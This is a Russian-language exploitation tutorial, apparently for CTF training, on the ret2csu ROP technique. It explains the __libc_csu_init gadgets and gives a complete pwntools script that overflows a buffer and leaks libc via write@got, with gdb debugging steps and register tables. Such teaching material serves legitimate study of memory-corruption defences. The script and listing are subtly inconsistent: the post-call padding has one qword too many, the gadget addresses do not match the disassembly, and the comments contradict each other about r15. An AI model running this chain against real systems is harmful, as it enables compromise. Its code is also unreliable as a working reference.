ret2csu — техника, позволяющая управлять регистрами `rdi`, `rsi`, `rdx` через «универсальные» гаджеты, которые компилятор оставляет в функции `__libc_csu_init`. Эта функция присутствует почти в каждом динамически слинкованном бинаре, собранном GCC, и содержит две полезные последовательности, из которых можно собрать вызов функции с тремя аргументами — даже если в бинаре нет отдельных `pop rdi`/`pop rsi`/`pop rdx` гаджетов. Это классический «план Б», когда гаджетов не хватает.

## Зачем нужен ret2csu

Многие небольшие бинари (особенно учебные и CTF) не содержат нужных pop-гаджетов: компилятор их просто не породил. Тогда собрать `read(0, bss, 0x100)` или `write(1, got, 8)` напрямую нельзя. Но `__libc_csu_init` компилируется всегда при линковке с glibc, и в её хвосте есть универсальная настройка регистров. Разобрав её, получаем контроль над `rbx`, `rbp`, `r12`, `r13`, `r14`, `r15`, а через них — над `rdi`, `rsi`, `rdx` в момент вызова указателя.

## Дизассемблер __libc_csu_init

```bash
objdump -d -M intel ./chall | grep -A40 '<__libc_csu_init>:'
```

Типичный хвост (адреса условны):

```asm
00000000004011c0 <__libc_csu_init>:
  ...
  4011c0:  mov    rdx, r14
  4011c3:  mov    rsi, r13
  4011c6:  mov    edi, r12d
  4011c9:  call   QWORD PTR [r15+rbx*8]
  4011cd:  add    rbx, 1
  4011d1:  cmp    rbp, rbx
  4011d4:  jne    4011c0
  4011d6:  add    rsp, 8
  4011db:  pop    rbx
  4011dc:  pop    rbp
  4011dd:  pop    r12
  4011df:  pop    r13
  4011e1:  pop    r14
  4011e3:  pop    r15
  4011e5:  ret
```

Два ключевых фрагмента: «поп-блок» начиная с `4011d6` (снимает со стека rbx, rbp, r12, r13, r14, r15 и делает `ret`) и «call-блок» начиная с `4011c0` (`mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]`). Комбинируя их, выставляем r12/r13/r14 и вызываем нужную функцию.

## Как строится цепочка

Порядок вызовов:

1. Прыгнуть на `pop-блок` (обычно `0x4011da` или адрес первого `pop`) — он заполнит rbx=0, rbp=1, r12=edi, r13=rsi, r14=rdx, r15=указатель на таблицу с адресом функции.
2. Прыгнуть на `call-блок` (`0x4011c0`) — он перенесёт r14→rdx, r13→rsi, r12d→edi и выполнит `call [r15+rbx*8]`, то есть вызовет функцию по адресу из памяти.
3. После возврата функции исполнение продолжается на `4011cd`: `add rbx,1; cmp rbp,rbx; jne 4011c0`. Чтобы не зациклиться, ставим rbp=1, rbx=0 → после `add` rbx=1, `cmp rbp,rbx` равны → цикл не повторяется, идёт `add rsp,8; pop rbx...; pop r15; ret`.

Нюанс: между call-блоком и pop-блоком лежит `add rsp, 8` — то есть после вызова функции стек сдвигается на 8 байт, которые надо «пропустить» фиктивным значением.

## Полный пример: вызов write(1, got, 8)

Цель — утечь libc через `write@plt(1, write@got, 8)`. В бинаре нет `pop rdx`.

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
OFFSET = 72

csu_pop  = 0x4011da   # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
csu_call = 0x4011c0   # mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]

def start():
    return process('./chall') if args.LOCAL else remote('host', 1337)

def exploit():
    p = start()
    # в bss положим указатель на write@got, чтобы [r15+rbx*8] == write@got
    write_got = elf.got['write']
    bss = elf.bss() + 0x200
    # сначала read(0, bss, 8) -> кладём write@got в bss (или используем r15 напрямую)
    # упрощённо: r15 указывает на таблицу, где лежит адрес write@plt
    rop  = p64(csu_pop)
    rop += p64(0)            # rbx = 0
    rop += p64(1)            # rbp = 1
    rop += p64(1)            # r12 = edi = fd 1
    rop += p64(write_got)    # r13 = rsi = адрес для чтения
    rop += p64(8)            # r14 = rdx = длина
    rop += p64(elf.got['write'])  # r15 = указатель на указатель функции
    rop += p64(csu_call)
    rop += p64(0)            # add rsp,8 -> пропуск
    rop += p64(0)*7          # rbx,rbp,r12,r13,r14,r15 (для pop-блока после call)
    rop += p64(elf.symbols['main'])
    p.sendlineafter(b'> ', flat({OFFSET: rop}))
    leak = p.recv(8)
    log.success(f'leak = {leak.hex()}')
    p.interactive()

exploit()
```

Практическая тонкость: `call [r15+rbx*8]` требует, чтобы по адресу `r15` лежал адрес вызываемой функции. Обычно r15 указывает на GOT-запись `write@got`, а по ней уже находится реальный адрес `write` в libc — то есть вызов идёт прямо на `write`. Это и используется.

## Альтернатива: сразу указатель на функцию в .bss

Если сначала есть `read(0, bss, ...)`, можно записать в bss адрес `system` (после утечки libc), затем вторым раундом ret2csu вызвать `system(bss)` с аргументом-строкой `/bin/sh`. Так обходят отсутствие `pop rdi`.

## Тонкости и подводные камни

- **Смещение pop-блока зависит от компилятора.** Найдите его дизассемблером; не хардкодьте адрес слепо.
- **`mov edi, r12d` обнуляет старшие биты.** Годится для fd (малые числа), но не для 64-битных указателей в rdi.
- **`add rsp, 8` после call.** Забыть про него — сдвинуть всю цепочку.
- **rbp должен равняться rbx+1** в конце, иначе бесконечный цикл.
- **PIE.** Адреса csu-гаджетов нужно пересчитать по базе.
- **glibc 2.34+.** `__libc_csu_init` может отсутствовать или быть иным; проверьте дизассемблер.
- **Статическая линковка.** Функции может не быть вовсе — используйте ret2dlresolve.

## Справочные таблицы

| Регистр | Роль в call-блоке |
|---|---|
| r12 | edi (1-й аргумент, 32 бита) |
| r13 | rsi (2-й аргумент) |
| r14 | rdx (3-й аргумент) |
| r15 | база таблицы вызова |
| rbx | индекс в таблице |
| rbp | счётчик цикла |

| Ситуация | Решение |
|---|---|
| нет pop rdi/rsi/rdx | ret2csu |
| нет даже csu | ret2dlresolve |
| только syscall | SROP |

## Что дальше / решение

Дальше: `pwn-ret2dlresolve` (когда нет ни гаджетов, ни нужных функций в PLT), `pwn-seccomp-srop` (когда гаджетов совсем мало), `pwn-rop` (общая сборка). Практический алгоритм: `ROPgadget --only 'pop|ret'` — если `pop rdi`/`pop rsi`/`pop rdx` есть, ret2csu не нужен; если нет, найдите `__libc_csu_init` дизассемблером, определите адреса pop-блока и call-блока, соберите цепочку с rbx=0, rbp=1. ret2csu — надёжный обход нехватки гаджетов, который стоит держать в арсенале.

## Пошаговый разбор цепочки ret2csu

Разберём, что происходит со стеком на каждом шаге, чтобы цепочку можно было собрать для любой функции. Обозначим `P` — адрес pop-блока (`pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret`), `C` — адрес call-блока (`mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]`).

Шаг 1. Мы переполнили буфер и вернулись на `P`. Стек выглядит так: `[P][rbx][rbp][r12][r13][r14][r15][C][gap8][...]`. Pop-блок снимает шесть значений и делает `ret` на `C`.

Шаг 2. `C` выполняет `mov rdx, r14`, `mov rsi, r13`, `mov edi, r12d` и `call [r15+rbx*8]`. Если `rbx=0`, вызов идёт по адресу `[r15]`. Мы выбираем `r15` так, чтобы `[r15]` содержал адрес нужной функции. Чаще всего `r15 = got[func]` — тогда `[r15]` — реальный адрес `func` в libc (после резолва), и вызов идёт туда. Либо, если резолва ещё не было, `[r15]` указывает в PLT, что тоже работает.

Шаг 3. Функция отрабатывает и делает `ret`. Управление возвращается на `C+...` — на `add rbx, 1; cmp rbp, rbx; jne C`. Чтобы цикл не повторился, ставим `rbp = 1`, тогда после `add` rbx=1 и сравнение даёт равенство.

Шаг 4. Идёт `add rsp, 8` (пропуск `gap8`) и pop-блок снова снимает шесть значений, после чего `ret` возвращается туда, куда мы укажем — например, в `main` для второго раунда.

## Что вызывать через ret2csu

Типичные цели: `read(0, bss, n)` — чтобы загрузить вторую цепочку или строку `/bin/sh`; `write(1, got, 8)` — чтобы утечь libc; `execve`/`system` — если получилось выставить rdi на строку (но `mov edi, r12d` обнуляет старшие биты, поэтому rdi должен быть в пределах 32 бит — bss обычно подходит). Для утечки `write` — самый удобный выбор, потому что печатает ровно n байт без остановки на `\x00`.

## Отладка ret2csu

Поставьте брейкпоинт на `P` и `C`, смотрите регистры и стек:

```bash
gdb ./chall
(gdb) b *0x4011da
(gdb) b *0x4011c0
(gdb) run < payload
(gdb) info registers rbx rbp r12 r13 r14 r15 rsp
(gdb) x/8gx $rsp
```

Если `call [r15+rbx*8]` уходит не туда, проверьте `r15` и содержимое `[r15]`. Если цикл повторяется бесконечно — `rbp` не равен `rbx+1`. Если после возврата стек сдвинут — не учли `add rsp, 8`.

## Расширенная таблица типичных значений

| Поле | Значение для write(1,got,8) | Значение для read(0,bss,n) |
|---|---|---|
| rbx | 0 | 0 |
| rbp | 1 | 1 |
| r12 (edi) | 1 | 0 |
| r13 (rsi) | got | bss |
| r14 (rdx) | 8 | n |
| r15 | got[write] | got[read] |
